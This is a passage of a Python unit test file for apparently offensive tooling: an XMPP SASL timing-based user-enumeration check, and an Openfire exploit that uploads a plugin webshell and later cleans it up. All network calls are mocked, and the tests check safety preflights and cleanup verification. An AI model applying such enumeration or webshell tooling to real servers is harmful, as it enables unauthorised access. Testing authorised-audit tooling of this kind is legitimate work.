            env = {**os.environ, "PATH": f"{fake_bin}:{os.environ['PATH']}"}
            run = subprocess.run(["make", "all"], cwd=root, env=env, text=True, capture_output=True)
            self.assertNotEqual(run.returncode, 0)
            self.assertFalse(marker.exists(), run.stdout + run.stderr)
            self.assertIn("provenance invalid", run.stdout + run.stderr)


class JabberSemantics(unittest.TestCase):
    def test_generic_rejection_is_neutral(self):
        result = JABBER._classify_sasl_response(
            "alice", b"<failure><not-authorized/></failure>", JABBER.time.monotonic())
        self.assertEqual(result["verdict"], "SASL_NOT_AUTHORIZED")

    def test_controls_keep_equal_users_indistinguishable(self):
        probes = [{"user": "alice", "verdict": "SASL_NOT_AUTHORIZED", "elapsed_ms": x} for x in (100, 102)]
        controls = [{"user": "c", "verdict": "SASL_NOT_AUTHORIZED", "elapsed_ms": x} for x in (98, 104, 101)]
        self.assertEqual(JABBER._apply_differential(probes, controls, 50)[0]["verdict"], "INDISTINGUISHABLE")
        probes = [{"user": "alice", "verdict": "SASL_NOT_AUTHORIZED", "elapsed_ms": x} for x in (250, 260)]
        self.assertEqual(JABBER._apply_differential(probes, controls, 50)[0]["verdict"], "LIKELY_EXISTS")


class OpenfireSemantics(unittest.TestCase):
    def _args(self, jar=None, log=None, marker="BENIGN"):
        return argparse.Namespace(url="http://openfire.test:9090", plugin_jar=jar,
                                  proof_marker=marker, proof_path="health.jsp", log=log or "unused.json",
                                  admin_user="audit", admin_pass="fixture", plugin_name=None)

    def test_distinct_plugin_preflights_make_zero_mutation_calls(self):
        calls = []
        with mock.patch.object(OPENFIRE, "_http", side_effect=lambda *a, **k: calls.append(a) or (500, {}, b"")), \
             contextlib.redirect_stdout(io.StringIO()) as omitted_out:
            self.assertEqual(OPENFIRE.cmd_exploit(self._args(jar=None)), 64)
        self.assertIn("PLUGIN_ARGUMENT_OMITTED", omitted_out.getvalue())
        with mock.patch.object(OPENFIRE, "_http", side_effect=lambda *a, **k: calls.append(a) or (500, {}, b"")), \
             contextlib.redirect_stdout(io.StringIO()) as unreadable_out:
            self.assertEqual(OPENFIRE.cmd_exploit(self._args(jar="/definitely/missing.jar")), 66)
        self.assertIn("PLUGIN_UNREADABLE", unreadable_out.getvalue())
        self.assertEqual(calls, [])

    def test_log_directory_and_unwritable_destination_fail_before_mutation(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td); jar = root / "audit-plugin.jar"
            with zipfile.ZipFile(jar, "w") as archive:
                archive.writestr("plugin.xml", "<plugin><name>Audit Plugin</name></plugin>")
            calls = []
            with mock.patch.object(OPENFIRE, "_http", side_effect=lambda *a, **k: calls.append(a) or (500, {}, b"")), \
                 mock.patch.object(OPENFIRE, "_typed_fqdn_confirm") as confirm, \
                 contextlib.redirect_stdout(io.StringIO()) as directory_out:
                self.assertEqual(OPENFIRE.cmd_exploit(self._args(str(jar), str(root))), 66)
            self.assertIn("RECOVERY_LOG_INVALID", directory_out.getvalue())
            confirm.assert_not_called(); self.assertEqual(calls, [])
            with mock.patch.object(OPENFIRE, "_validate_log_destination",
                                   return_value=("RECOVERY_LOG_UNWRITABLE", "fixture denied")), \
                 mock.patch.object(OPENFIRE, "_http", side_effect=lambda *a, **k: calls.append(a) or (500, {}, b"")), \
                 mock.patch.object(OPENFIRE, "_typed_fqdn_confirm") as confirm, \
                 contextlib.redirect_stdout(io.StringIO()) as unwritable_out:
                self.assertEqual(OPENFIRE.cmd_exploit(self._args(str(jar), str(root / "recovery.json"))), 66)
            self.assertIn("RECOVERY_LOG_UNWRITABLE", unwritable_out.getvalue())
            confirm.assert_not_called(); self.assertEqual(calls, [])

    def test_upload_failure_is_partial_nonzero_and_recoverable(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td); jar = root / "audit-plugin.jar"; log = root / "recovery.json"
            with zipfile.ZipFile(jar, "w") as archive:
                archive.writestr("plugin.xml", "<plugin><name>Audit Plugin</name></plugin>")
            responses = iter([(200, {}, b"created"), (500, {}, b"rejected")])
            with mock.patch.object(OPENFIRE, "_typed_fqdn_confirm", return_value=True), \
                 mock.patch.object(OPENFIRE, "_admin_session", return_value=(True, object(), object(), b"")), \
                 mock.patch.object(OPENFIRE, "_http", side_effect=lambda *a, **k: next(responses)), \
                 contextlib.redirect_stdout(io.StringIO()):
                self.assertEqual(OPENFIRE.cmd_exploit(self._args(str(jar), str(log))), 4)
            state = json.loads(log.read_text())
            self.assertEqual(state["step_reached"], "plugin_upload_response")
            self.assertEqual(state["recovery_reason"], "PLUGIN_UPLOAD_REJECTED")
            self.assertNotEqual(state["step_reached"], "full_chain_verified")

    def test_cleanup_is_idempotent_when_both_artifacts_are_absent(self):
        with tempfile.TemporaryDirectory() as td:
            log = Path(td) / "recovery.json"
            log.write_text(json.dumps({"target_base": "http://openfire.test:9090", "admin_user": "audit",
                                       "admin_pass": "fixture", "plugin_name": "Audit Plugin",
                                       "plugin_context": "audit-plugin", "proof_marker": "BENIGN",
                                       "webshell_url": "http://openfire.test:9090/plugins/audit-plugin/health.jsp",
                                       "cleanup": {"verified": True, "plugin_inventory_absent": True}}))
            with mock.patch.object(OPENFIRE, "_http", return_value=(404, {}, b"")), \
                 mock.patch.object(OPENFIRE, "_admin_session", return_value=(False, object(), object(), b"")), \
                 contextlib.redirect_stdout(io.StringIO()):
                self.assertEqual(OPENFIRE.cmd_cleanup(argparse.Namespace(log=str(log))), 0)
            self.assertTrue(json.loads(log.read_text())["cleanup"]["idempotent"])

    def test_marker_absence_and_failed_admin_login_do_not_prove_plugin_absence(self):
        with tempfile.TemporaryDirectory() as td:
            log = Path(td) / "recovery.json"
            log.write_text(json.dumps({"target_base": "http://openfire.test:9090", "admin_user": "audit",
                                       "admin_pass": "fixture", "plugin_name": "Audit Plugin",
                                       "plugin_context": "audit-plugin", "proof_marker": "BENIGN",
                                       "webshell_url": "http://openfire.test:9090/plugins/audit-plugin/health.jsp"}))
            with mock.patch.object(OPENFIRE, "_http", return_value=(404, {}, b"")), \
                 mock.patch.object(OPENFIRE, "_admin_session", return_value=(False, object(), object(), b"")), \
                 contextlib.redirect_stdout(io.StringIO()):
                self.assertEqual(OPENFIRE.cmd_cleanup(argparse.Namespace(log=str(log))), 3)
            final = json.loads(log.read_text())
            self.assertEqual(final["cleanup"]["recovery_reason"], "PLUGIN_INVENTORY_UNAVAILABLE")
            self.assertFalse(final["cleanup"].get("verified", False))

    def test_inventory_still_listing_plugin_blocks_cleanup_success(self):
        with tempfile.TemporaryDirectory() as td:
            log = Path(td) / "recovery.json"
            log.write_text(json.dumps({"target_base": "http://openfire.test:9090", "admin_user": "audit",
                                       "admin_pass": "fixture", "plugin_name": "Audit Plugin",
                                       "plugin_context": "audit-plugin", "proof_marker": "BENIGN",
                                       "webshell_url": "http://openfire.test:9090/plugins/audit-plugin/health.jsp",
                                       "cleanup": {}}))
            inventory = b'<a href="plugin-admin.jsp?delete=audit-plugin&amp;csrf=x">remove</a>'
            def fake_session(_opener, url, **_kwargs):
                if "plugin-admin.jsp?delete=" in url:
                    return 200, {}, b""
                if url.endswith("plugin-admin.jsp"):
                    return 200, {}, inventory
                raise AssertionError(f"unexpected request after inventory failure: {url}")
            with mock.patch.object(OPENFIRE, "_http", return_value=(404, {}, b"")), \
                 mock.patch.object(OPENFIRE, "_admin_session", return_value=(True, object(), object(), b"")), \
                 mock.patch.object(OPENFIRE, "_session_http", side_effect=fake_session), \
                 contextlib.redirect_stdout(io.StringIO()):
                self.assertEqual(OPENFIRE.cmd_cleanup(argparse.Namespace(log=str(log))), 5)
            final = json.loads(log.read_text())
            self.assertEqual(final["cleanup"]["recovery_reason"], "PLUGIN_REMOVAL_UNVERIFIED")
            self.assertFalse(final["cleanup"].get("verified", False))

    def test_generic_http_200_is_not_plugin_inventory_proof(self):
        with tempfile.TemporaryDirectory() as td:
            log = Path(td) / "recovery.json"
            log.write_text(json.dumps({"target_base": "http://openfire.test:9090", "admin_user": "audit",
                                       "admin_pass": "fixture", "plugin_name": "Audit Plugin",
                                       "plugin_context": "audit-plugin", "proof_marker": "BENIGN",
                                       "webshell_url": "http://openfire.test:9090/plugins/audit-plugin/health.jsp",
                                       "cleanup": {}}))
            with mock.patch.object(OPENFIRE, "_http", return_value=(404, {}, b"")), \
                 mock.patch.object(OPENFIRE, "_admin_session", return_value=(True, object(), object(), b"")), \
                 mock.patch.object(OPENFIRE, "_session_http", return_value=(200, {}, b"<title>Dashboard</title>")), \
                 contextlib.redirect_stdout(io.StringIO()):
                self.assertEqual(OPENFIRE.cmd_cleanup(argparse.Namespace(log=str(log))), 4)
            self.assertEqual(json.loads(log.read_text())["cleanup"]["recovery_reason"],
                             "PLUGIN_INVENTORY_UNAVAILABLE")

    def test_cleanup_discovers_actions_and_verifies_reversal(self):
        with tempfile.TemporaryDirectory() as td:
            log = Path(td) / "recovery.json"
            log.write_text(json.dumps({"target_base": "http://openfire.test:9090", "admin_user": "audit",
                                       "admin_pass": "fixture", "plugin_name": "Audit Plugin",
                                       "plugin_context": "audit-plugin", "proof_marker": "BENIGN",
                                       "webshell_url": "http://openfire.test:9090/plugins/audit-plugin/health.jsp",
                                       "cleanup": {}}))
            state = {"plugin": True, "user": True}
            def fake_http(*_a, **_k):
                return (200, {}, b"BENIGN") if state["plugin"] else (404, {}, b"")
            def fake_admin(*_a, **_k):
                return (state["user"], object(), object(), b"")
            def fake_session(_opener, url, **_kwargs):
                if "plugin-admin.jsp?delete=" in url:
                    state["plugin"] = False; return 200, {}, b""
                if url.endswith("plugin-admin.jsp"):
                    body = (b'<a href="plugin-admin.jsp?delete=audit-plugin&amp;csrf=x">remove</a>'
                            if state["plugin"] else b"<title>Plugins</title>")
                    return 200, {}, body
                if "user-delete.jsp" in url:
                    state["user"] = False; return 200, {}, b""
                if "user-edit-form.jsp" in url:
                    return 200, {}, b'<a href="user-delete.jsp?username=audit&amp;csrf=x">delete</a>'
                return 200, {}, b""
            with mock.patch.object(OPENFIRE, "_http", side_effect=fake_http), \
                 mock.patch.object(OPENFIRE, "_admin_session", side_effect=fake_admin), \
                 mock.patch.object(OPENFIRE, "_session_http", side_effect=fake_session), \
                 contextlib.redirect_stdout(io.StringIO()):
                self.assertEqual(OPENFIRE.cmd_cleanup(argparse.Namespace(log=str(log))), 0)
            final = json.loads(log.read_text())
            self.assertTrue(final["cleanup"]["verified"])
            self.assertFalse(state["plugin"]); self.assertFalse(state["user"])


if __name__ == "__main__":
    unittest.main()
